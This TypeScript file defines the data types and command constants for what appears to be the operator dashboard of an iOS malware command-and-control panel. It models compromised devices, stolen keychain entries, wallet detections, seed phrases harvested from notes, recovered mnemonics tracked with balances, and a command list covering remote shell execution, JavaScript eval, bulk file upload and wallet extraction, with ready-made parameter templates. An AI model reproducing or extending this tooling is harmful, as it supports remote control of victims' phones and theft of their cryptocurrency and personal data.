/**
 * 后端契约类型（对应 boot-analysis/backend/DATA_CONTRACT.md v2.0 + FRONTEND_CONTRACT.md）
 *
 * 纪律：
 *  - 字段以后端真实回传为准，不臆造；未命中的键一律按可选处理（后端可能整段缺省）。
 *  - `ts` 全为后端格式化后的 UTC 字符串，前端不做时区偏移计算（契约 §4.5）。
 */

/** /__dash/api 主数据口快照 */
export interface DashSnapshot {
  ts: string
  /** 设备台账（已按 (ip, ua, deviceVersion) 去重） */
  devices: Device[]
  /** PE 上线里程碑（事件级，不去重） */
  pe_events: PeEvent[]
  /** 钱包命中汇总：{rule, display, count, last_ts} */
  wallets: WalletStat[]
  /** /log.html 同步打点（样本探针日志） */
  log: ProbeLog[]
  /** 访问审计 */
  access: AccessLog[]
  /** capture/ 下每个子目录 → 最近 N 条（新的在前），key 动态 */
  endpoints: Record<string, PacketItem[]>
  /** 各端点累计计数，key 与 endpoints 对应且动态 */
  counts: Record<string, number>
  /** 部分后端版本带 progress（进度锚点）；Go 版走 /panel/api/progress */
  progress?: ProgressRow[]
}

export interface Device {
  ts: string
  channelCode?: string
  deviceVersion?: string
  domain?: string
  ip?: string
  ua?: string
  host?: string
  first_seen?: string
  uuid?: string
  machine?: string
  ios?: string
  build?: string
  online?: boolean
  [k: string]: unknown
}

export interface PeEvent {
  ts: string
  ip?: string
  ua?: string
  host?: string
  detail?: string
}

export interface WalletStat {
  rule: string
  display?: string
  count: number
  last_ts?: string
}

export interface ProbeLog {
  ts: string
  channel?: string
  id?: string | number
  hex?: string
  text?: string
}

export interface AccessLog {
  ts: string
  role?: string
  method?: string
  path?: string
  query?: string
  host?: string
  client?: string
  ua?: string
  status?: number
  cost_ms?: number
}

/** 单条回传包（列表预览：body 可能已截断，全量走 /__dash/file） */
export interface PacketItem {
  ts: string
  file: string
  size: number
  /** 后端按端点提炼的字段摘要 */
  parsed?: PacketParsed
  body?: string
}

export interface PacketParsed {
  kind?: string
  hint?: string
  file?: string
  size?: number
  // beacon
  uuid?: string | null
  machine?: string | null
  ios?: string | null
  build?: string | null
  status?: string | null
  // sync
  channelCode?: string | null
  deviceVersion?: string | null
  domain?: string | null
  // u
  lhu?: string | null
  app_count?: number | null
  apps_sample?: unknown[]
  // nb
  note_count?: number | null
  notes_sample?: unknown[]
  db_files?: unknown[]
  // result
  command_id?: string | null
  // war
  probe?: string | null
  // 兜底
  raw?: unknown
  [k: string]: unknown
}

export interface ProgressRow {
  ip?: string
  pct?: number
  stage?: string
  ts?: string
  [k: string]: unknown
}

/** /panel/api/progress —— 交付进度（阶段权重表 + 按 IP 的行） */
export interface ProgressResp {
  checkpoints?: Array<{ stage?: string; pct?: number; [k: string]: unknown }>
  rows?: Array<Record<string, unknown>>
  [k: string]: unknown
}

export interface DeviceRow {
  ip?: string
  device_version?: string
  channel_code?: string
  domain?: string
  host?: string
  ua?: string
  last_seen?: string
  first_seen?: string
  progress?: number
  stage?: string
  [k: string]: unknown
}

/** 钱包命中条目（walletsMeta 返回的 {rule, display, count, bundle_ids}） */
export interface WalletHit {
  rule?: string
  display?: string
  count?: number
  /** 回配到该设备实际安装的包名（精确 bundle_id，升序；来自设备 /u 回传） */
  bundle_ids?: string[]
}

/** /panel/api/device/{uuid}/apps —— 单设备已安装应用包名（精确 uuid 匹配） */
export interface DeviceAppRow {
  bundle_id?: string
  name?: string
  app_uuid?: string
  first_seen?: string
  last_seen?: string
  hits?: number
}

/** /panel/api/device/{uuid}/assets —— war 原包条目（设备详情下载用） */
export interface WarFileRef {
  file?: string
  packet_id?: number
  size?: number
  ts?: string
}

/** /panel/api/device/{uuid}/assets —— 单设备资产钻取（设备详情抽屉） */
export interface DeviceAssets {
  uuid?: string
  profile?: {
    deviceName?: string
    machine?: string
    ios?: string
    build?: string
    status?: string
    [k: string]: unknown
  }
  wallets?: WalletHit[]
  wallet_names?: string[]
  war_files?: WarFileRef[]
  war_count?: number
  notes_count?: number
  apps_count?: number
}

/** /panel/api/devices —— 我的设备（受控设备，/a /beacon 收包解析，不含交付进度） */
export interface ManagedDevice {
  uuid?: string
  ip?: string
  first_seen?: string
  last_seen?: string
  online?: boolean
  machine?: string
  ios?: string
  build?: string
  status?: string
  deviceName?: string
  war_count?: number
  war_files?: WarFileRef[]
  wallets?: WalletHit[]
  notes_count?: number
  apps_count?: number
  /** WhatsApp 有无（按应用资产包名 whatsapp 映射） */
  ws?: boolean
  progress?: number
  stage?: string
  [k: string]: unknown
}

/** /panel/api/devices —— 服务端分页响应（每页默认 20；kw/wallet 筛选下推） */
export interface ManagedDevicesPage {
  devices?: ManagedDevice[]
  /** 当前筛选条件下的设备总数（分页总数） */
  total?: number
  /** 全量钱包设备数（头部 chip，与筛选无关） */
  wallet_count?: number
  page?: number
  per?: number
  [k: string]: unknown
}

/** /panel/api/visits —— 访问设备（sync 信标访客台账，devices 表） */
export interface VisitorRow {
  ts?: string
  ip?: string
  device_version?: string
  channel_code?: string
  domain?: string
  host?: string
  ua?: string
  [k: string]: unknown
}

/** /panel/api/visits —— 服务端分页响应（每页默认 20；kw 筛选下推） */
export interface VisitsPage {
  records?: VisitorRow[]
  /** 当前筛选条件下的行数（分页总数） */
  total?: number
  /** 去重来访数（全量口径，头部 chip） */
  total_visits?: number
  today_visits?: number
  page?: number
  per?: number
  [k: string]: unknown
}

/** /panel/api/war 行（keychain items / wallet / envelope 平铺） */
export interface WarRow {
  tbl?: string
  bundleId?: string
  service?: string
  account?: string
  rowid?: string | number
  file?: string
  ts?: string
  device_uuid?: string
  [k: string]: unknown
}

/** /panel/api/apps 行 */
export interface AppRow {
  bundleId?: string
  name?: string
  uuid?: string
  lhu?: string
  ts?: string
  packet_id?: number | string
  file?: string
  [k: string]: unknown
}

/** /panel/api/notes 行 */
export interface NoteRow {
  id?: number | string
  packet_id?: number | string
  ts?: string
  title?: string
  snippet?: string
  body?: string
  note_id?: number | string
  mod_ts?: string
  recv_ts?: string
  uuid?: string
  lhu?: string
  file?: string
  [k: string]: unknown
}

export interface Paged<T> {
  total?: number
  total_pkgs?: number
  page?: number
  rows?: T[]
  ep?: string
  [k: string]: unknown
}

/** /panel/api/memos/bip39 —— BIP39 助记词命中行（记录表 memo_bip39） */
export interface Bip39Row {
  uuid?: string
  note_id?: number
  field?: string // title / snippet
  phrase?: string // 纠正后短语
  raw?: string // 原文窗口
  words?: number
  valid?: boolean
  reason?: string
  corrected?: number
  unknown?: number
  scanned_at?: string
}

export interface Bip39Page {
  rows?: Bip39Row[]
  total?: number
  page?: number
  per?: number
  [k: string]: unknown
}

/** /panel/api/bip39/words —— BIP39 词表 */
export interface Bip39WordRow {
  idx?: number
  word?: string
}

export interface Bip39WordPage {
  rows?: Bip39WordRow[]
  total?: number
  page?: number
  per?: number
  [k: string]: unknown
}

/** /panel/api/war/files —— war 包文件（工具检测模块） */
export interface WarFileRow {
  packet_id?: number
  uuid?: string
  file?: string
  size?: number
  ts?: string
}

/** /panel/api/war/scans —— /war 自动检测结果（war_scan 表） */
export interface WarScanRow {
  packet_id?: number
  uuid?: string
  analyzed_ts?: string
  ok?: boolean
  brands?: string
  mnemonic_cnt?: number
  valid_cnt?: number
  keystore_dec?: number
  secrets_cnt?: number
  emails?: string
  err?: string
  has_detail?: boolean
}

export interface WarScanPage {
  rows?: WarScanRow[]
  total?: number
  page?: number
  per?: number
  stats?: { scanned?: number; valid?: number; keystores?: number; mnemonics?: number }
}

/** /panel/api/words —— 助记词库（解析/还原出来的助记词） */
export interface RecoveredWordRow {
  id?: number
  uuid?: string
  source?: string
  packet_id?: number
  phrase?: string
  words?: number
  valid?: boolean
  wallet?: string
  crosscheck?: string
  created_ts?: string
  balance_usd?: number
  balance_ts?: string
  balance_summary?: string
  monitored?: boolean
  has_balance?: boolean
}

export interface RecoveredWordsPage {
  rows?: RecoveredWordRow[]
  total?: number
  page?: number
  per?: number
  stats?: { total?: number; valid?: number }
}

/** /panel/api/war —— keychain 钱包命中条目（仅钱包包名入库） */
export interface KeychainItemRow {
  id?: number
  packet_id?: number
  device_uuid?: string
  tbl?: string // genp | inet | cert | keys
  wallet_rule?: string // 钱包规则命中（空 = 未命中，v10 起不落库）
  service?: string
  account?: string
  access_group?: string
  label?: string
  data_hex?: string
  data_len?: number
  protection_class?: string
  version?: string
  blob_sizes?: string
  rowid_orig?: string
  recv_ts?: string
  /** 复见统计（v9 起实体级 UPSERT） */
  hits?: number
  first_seen?: string
  last_seen?: string
}

/** /panel/api/keychain/devices —— 设备维度 keychain 概览（仅钱包命中条目入库） */
export interface KeychainDevice {
  device_uuid?: string
  total_items?: number
  genp?: number
  inet?: number
  cert?: number
  keys?: number
  wallet_items?: number
  wallet_kinds?: number
  last_recv?: string
  /** 该设备最近一次含钱包的 war 包 packet id（供下载原文件） */
  war_pid?: number
  /** war 包文件名（capture/war/<name>） */
  war_file?: string
}

/** /panel/api/keychain/wallets —— 钱包规则命中汇总 */
export interface KeychainWalletStat {
  wallet_rule?: string
  items?: number
  devices?: number
  last_recv?: string
}

/** /panel/api/results —— 指令结果（result 端点 data 解码落库） */
export interface ResultRow {
  id?: number
  packet_id?: number
  command_id?: string
  uuid?: string
  filename?: string
  category?: string
  data_kind?: string // json | binary
  data_size?: number
  exec_start_ms?: number
  exec_end_ms?: number
  recv_ts?: string
  preview?: string
}

/** /panel/api/result/{id} —— 单条结果全文 */
export interface ResultDetail {
  id?: number
  packet_id?: number
  command_id?: string
  uuid?: string
  filename?: string
  category?: string
  data_json?: string
  data_kind?: string
  data_size?: number
  exec_start_ms?: number
  exec_end_ms?: number
  recv_ts?: string
}

/** /__q/commands 指令行 */
export interface CommandRow {
  id?: number
  command_id?: string
  cmd_type?: string
  state?: string // armed | dispatched | ...
  armed_ts?: string
  dispatched_ts?: string | null
  client_ip?: string | null
  params?: unknown
  [k: string]: unknown
}

/** /panel/api/commands 当前 + 历史 */
export interface CommandState {
  current?: Record<string, unknown>
  history?: CommandRow[]
}

/** GET /__control —— peek 当前武装指令 */
export interface ControlPeek {
  command?: Record<string, unknown> | null
  once?: boolean
  [k: string]: unknown
}

export interface AuthMe {
  ok?: boolean
  user?: string
  error?: string
  [k: string]: unknown
}

export interface StatsResp {
  [k: string]: unknown
}

/** 指令类型白名单 —— 与样本端 c2_agent 命令循环一一对应，前端不得造词 */
export const COMMAND_TYPES = [
  'execute_command',
  'ls',
  'download',
  'photos',
  'apps',
  'exec',
  'file_upload',
  'basic_info',
  'disk_scan',
  'ios_app_data',
  'wallet_extract',
  'wallet_scan',
  'memo_scan',
  'photo_scan',
  'sleep',
] as const

export type CommandType = (typeof COMMAND_TYPES)[number]

/** 各指令的 params 模板（UI 预填；已对齐样本端 c2_agent 各 handleXxx 实际读取的字段） */
export const COMMAND_PARAM_HINT: Record<CommandType, string> = {
  execute_command: '{"command": "whoami", "timeout": 30}',
  ls: '{"path": "/var/mobile"}',
  download: '{"path": "/var/mobile/xx.db", "max_size": 5242880}',
  photos: '{"max_count": 20}',
  apps: '{}',
  // exec = 在设备端 eval 你发的 JS 代码（agent: var code = p.code; eval(code)）
  exec: '{"code": "return JSON.stringify({uuid: DEVICE_UUID})"}',
  file_upload: '{"upload_paths": ["/var/mobile"], "filter_mode": "none", "file_extensions": "db,sqlite,json"}',
  basic_info: '{}',
  disk_scan: '{}',
  ios_app_data: '{"targets": [{"bundle_id": "com.apple.mobilenotes"}], "max_file_size_mb": 500}',
  wallet_extract: '{"wallet_type": "imtoken"}',
  wallet_scan: '{}',
  memo_scan: '{}',
  photo_scan: '{"max_count": 200, "batch_size": 30}',
  sleep: '{"interval": 15}',
}

/** 指令类型显示名（与样本端 handler 对应；exec 即「执行 JS 代码」） */
export const COMMAND_TYPE_LABEL: Record<CommandType, string> = {
  execute_command: 'execute_command（shell 命令）',
  ls: 'ls（列目录）',
  download: 'download（下载文件）',
  photos: 'photos（相册）',
  apps: 'apps（应用清单）',
  exec: 'exec（执行 JS 代码）',
  file_upload: 'file_upload（批量上传文件）',
  basic_info: 'basic_info（设备信息）',
  disk_scan: 'disk_scan（磁盘扫描）',
  ios_app_data: 'ios_app_data（应用数据）',
  wallet_extract: 'wallet_extract（钱包提取）',
  wallet_scan: 'wallet_scan（钱包扫描）',
  memo_scan: 'memo_scan（备忘录）',
  photo_scan: 'photo_scan（照片批量）',
  sleep: 'sleep（调整 beacon 间隔）',
}

/** /__q/meta 允许查询的字段白名单（后端硬校验，前端同枚举以免 400） */
export const META_FIELDS = [
  'channelCode',
  'deviceVersion',
  'domain',
  'uuid',
  'status',
  'type',
  'machine',
  'hostname',
  'ios_version',
  'build_version',
  'command_id',
  '_task_type',
  'filename',
  'error',
  'signal',
  'lhu',
  'source',
  'list_count',
  'apps_count',
  'db_files_count',
  'wallets_count',
  'app_sample',
  'note_title',
  'db_file',
  '_hint',
] as const
